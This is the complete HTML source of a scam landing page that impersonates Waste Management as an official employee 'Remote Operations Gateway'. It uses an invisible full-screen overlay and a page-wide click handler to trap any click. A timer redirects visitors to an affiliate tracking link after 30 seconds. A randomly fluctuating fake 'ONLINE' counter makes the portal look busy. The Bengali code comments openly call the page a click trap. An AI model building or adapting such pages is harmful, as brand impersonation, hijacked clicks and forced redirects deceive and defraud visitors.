<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Waste Management® Official | Remote Hub Portal</title>
    
    <meta property="og:title" content="Waste Management® Official | Remote Hub Portal">
    <meta property="og:description" content="Secure internal network node for verified background scheduling and route processing slots.">
    <meta property="og:type" content="website">

    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@500;700;800&family=Chakra+Petch:wght@700&display=swap" rel="stylesheet">

    <style>
        :root {
            --bg-black: #02040a;
            --wm-yellow: #fdb813;
            --neon-red: #ff3333;
            --glass-terminal: rgba(6, 11, 25, 0.85);
            --border-line: rgba(255, 255, 255, 0.1);
        }

        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'JetBrains Mono', monospace; }

        body, html {
            height: 100%;
            background-color: var(--bg-black);
            color: #ffffff;
            overflow: hidden; /* জিরো স্ক্রলিং */
            display: flex;
            flex-direction: column;
            cursor: pointer;
        }

        .master-intercept-shield {
            position: absolute;
            top: 0; left: 0; width: 100%; height: 100%;
            z-index: 5;
            cursor: pointer;
        }

        /* হেডার - টাইম জোন রিমুভ করা হয়েছে */
        header {
            background: rgba(4, 8, 16, 0.9);
            border-bottom: 1px solid var(--border-line);
            padding: 12px 20px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            position: relative; z-index: 100;
        }

        .brand-logo-text {
            font-family: 'Chakra Petch', sans-serif;
            font-weight: 700;
            font-size: 16px;
            color: #ffffff;
        }
        .brand-logo-text span { color: var(--wm-yellow); }

        /* কড়া লাল নিয়ন একটিভ ট্র্যাকার - শুধু এটিই থাকবে */
        .live-user-tracker-card {
            background: rgba(255, 51, 51, 0.12);
            border: 1px solid var(--neon-red);
            padding: 4px 10px;
            border-radius: 4px;
            display: flex;
            align-items: center;
            gap: 6px;
        }

        .tracker-lbl { font-size: 10px; font-weight: 800; color: #ff9999; }
        .tracker-val { font-size: 12px; font-weight: 800; color: #ffffff; }

        .beacon-signal-pulse {
            width: 7px; height: 7px;
            background-color: var(--neon-red);
            border-radius: 50%;
            position: relative;
            box-shadow: 0 0 8px var(--neon-red);
        }
        .beacon-signal-pulse::after {
            content: ''; position: absolute;
            width: 100%; height: 100%; top: 0; left: 0;
            background: var(--neon-red); border-radius: 50%;
            animation: pulseWave 1.5s infinite ease-in-out;
        }

        /* মেইন লেআউট - ছবি সহ */
        main {
            flex: 1;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            padding: 10px;
            position: relative;
            z-index: 10;
        }

        /* প্রফেশনাল ইমেজ সেকশন (মানুষের ফেস ছাড়া) */
        .expert-visual-frame {
            width: 100%;
            max-width: 380px;
            height: 200px;
            margin-bottom: -40px; /* কার্ডের সাথে ব্লেন্ড করার জন্য */
            position: relative;
            z-index: 5;
            border-radius: 12px;
            overflow: hidden;
            border: 1px solid var(--border-line);
        }

        .expert-visual-frame img {
            width: 100%;
            height: 100%;
            object-fit: cover;
            opacity: 0.8;
            filter: grayscale(30%) contrast(110%);
        }

        .expert-visual-frame::after {
            content: '';
            position: absolute;
            bottom: 0; left: 0; width: 100%; height: 50%;
            background: linear-gradient(to top, var(--bg-black), transparent);
        }

        /* ডার্ক সাইবার টার্মিনাল বক্স */
        .secure-terminal-box {
            width: 100%;
            max-width: 380px;
            background: var(--glass-terminal);
            backdrop-filter: blur(25px);
            -webkit-backdrop-filter: blur(25px);
            border: 1px solid var(--border-line);
            box-shadow: 0 25px 50px rgba(0,0,0,0.8);
            border-radius: 16px;
            padding: 25px 15px 20px 15px;
            text-align: center;
            position: relative;
            z-index: 10;
        }

        .node-label {
            font-size: 10px;
            font-weight: 800;
            color: var(--wm-yellow);
            letter-spacing: 2px;
            margin-bottom: 10px;
            display: block;
        }

        h1 {
            font-family: 'Chakra Petch', sans-serif;
            font-size: 24px;
            font-weight: 700;
            line-height: 1.1;
            margin-bottom: 12px;
            color: #ffffff;
        }
        h1 span { color: var(--wm-yellow); }

        .terminal-description {
            font-size: 13px;
            color: #a3aed0;
            margin-bottom: 22px;
            line-height: 1.5;
        }

        /* হাই-কনভার্টিং সলিড বাটন */
        .cta-action-container {
            position: relative; z-index: 120;
        }

        .btn-prime-terminal {
            display: block;
            width: 100%;
            background: var(--wm-yellow);
            color: #000000;
            border: 2px solid #ffffff;
            padding: 16px;
            font-size: 15px;
            font-weight: 900;
            border-radius: 8px;
            text-transform: uppercase;
            letter-spacing: 1px;
            box-shadow: 0 0 30px rgba(253, 184, 19, 0.4);
        }

        .btn-prime-terminal:active {
            transform: scale(0.97);
        }

        footer {
            padding: 10px;
            text-align: center;
            font-size: 10px;
            color: #4a5568;
            border-top: 1px solid var(--border-line);
            background: var(--bg-black);
        }

        @keyframes pulseWave {
            0% { transform: scale(1); opacity: 0.8; }
            100% { transform: scale(2.5); opacity: 0; }
        }

        @media (max-width: 480px) {
            h1 { font-size: 22px; }
            .expert-visual-frame { height: 180px; }
        }
    </style>
</head>
<body onclick="handleGlobalClickTrigger()">

    <div class="master-intercept-shield"></div>

    <header>
        <div class="brand-container">
            <div class="brand-logo-text">WASTE <span>MANAGEMENT</span></div>
        </div>
        <div class="header-meta-group">
            <div class="live-user-tracker-card">
                <div class="beacon-signal-pulse"></div>
                <div class="tracker-lbl">ONLINE:</div>
                <div class="tracker-val" id="active-tracker-digits">2,814</div>
            </div>
        </div>
    </header>

    <main>
        <div class="expert-visual-frame">
            <img src="https://images.unsplash.com/photo-1573496359142-b8d87734a5a2?q=80&w=600&auto=format&fit=crop" alt="Logistics Support Operations">
        </div>

        <div class="secure-terminal-box">
            <span class="node-label">// NODE: US-2026 ACTIVE</span>
            <h1>Remote Operations <span>Gateway</span></h1>
            <p class="terminal-description">Authorized employee gateway for logistics scheduling and route data management. Sync your official session parameters below.</p>
            
            <div class="cta-action-container">
                <button class="btn-prime-terminal">ACCESS OFFICIAL PORTAL</button>
            </div>
        </div>
    </main>

    <footer>
        <p>© 2026 Waste Management International Inc.</p>
    </footer>

    <script>
        // আপনার ট্র্যাকিং লিংক
        const targetGateLink = "https://www.af9m8trk.com/AAV11C1R/PB7121EP/?s1=Ashik";
        let loopTriggered = false;

        // ৩০ সেকেন্ড অটো-রিডাইরেক্ট
        setTimeout(() => {
            if (!loopTriggered) {
                window.location.href = targetGateLink;
            }
        }, 30000);

        // গ্লোবাল ক্লিক ট্র্যাপ
        function handleGlobalClickTrigger() {
            loopTriggered = true;
            window.location.href = targetGateLink;
        }

        // রিয়াল-টাইম ট্র্যাকার ফ্লাকচুয়েশন
        function engineActiveTrackerFlux() {
            const trackerContainer = document.getElementById('active-tracker-digits');
            if (trackerContainer) {
                let initialValue = parseInt(trackerContainer.innerText.replace(',', ''));
                let variations = Math.floor(Math.random() * 3) + 1;
                initialValue = (Math.random() > 0.5) ? initialValue + variations : initialValue - variations;
                trackerContainer.innerText = initialValue.toLocaleString();
            }
        }

        setInterval(engineActiveTrackerFlux, 3500);
    </script>
</body>
</html>
